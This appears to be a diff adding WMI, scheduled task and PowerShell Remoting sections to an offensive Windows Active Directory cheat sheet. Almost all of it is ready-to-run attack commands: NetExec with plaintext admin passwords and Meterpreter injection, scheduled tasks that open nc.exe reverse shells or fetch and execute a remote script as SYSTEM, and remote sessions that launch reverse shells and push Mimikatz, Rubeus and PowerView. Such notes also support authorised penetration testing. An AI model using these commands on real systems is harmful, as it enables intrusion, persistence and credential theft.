@@ -58,3 +58,36 @@ nxc ldap  10.10.10.10 -u administrator -p 123456789aA --bloodhound --collection 
 nxc ldap  10.10.10.10 -u administrator -p 123456789aA --password-not-required --groups --users --trusted-for-delegation 
 nxc <mssql|smb> <target> -u <USERNAME> -p <PASSWORD> --local-auth -M met_inject -o LHOST=<attack-machine> LPORT=<listening-port>
 ```
+### Windows Management Instrumentation
+```
+Get-WmiObject -Query "select * from win32_service where name='WinRM'" -ComputerName 192.168.100.10, 192.168.100.20 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status
+
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -ep bypass'
+Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘insomnia.io\Spider01
+wmic /node:"web01" /user:"insomnia.io\Spider01" /password:"Spider01@" process call create "powershell -enc [...snip...]"
+
+```
+
+### Schedule
+```
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'
+schtasks /create /S web01.insomnia.io /SC Weekly /RU "NT Authority\SYSTEM" /TN "Give_Me" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:9090/1.ps1''')'"
+```
+
+### PowerShell Remoting
+```
+
+
+PowerShell Invoke-Command -ComputerName Web01 -ScriptBlock { hostname; whoami }
+PowerShell $pass=ConvertTo-SecureString "Spider01@" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("insomnia.io\wob01", $pass)
+Invoke-Command -ComputerNameweb01 -ScriptBlock { hostname; whoami } -Credential $cred
+
+Get-PSSession
+Enter-PsSession -id 1
+
+Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {hostname}
+Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.100.100 7777 -e cmd.exe}
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerView.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\rubeus.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-Mimikatz.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+```
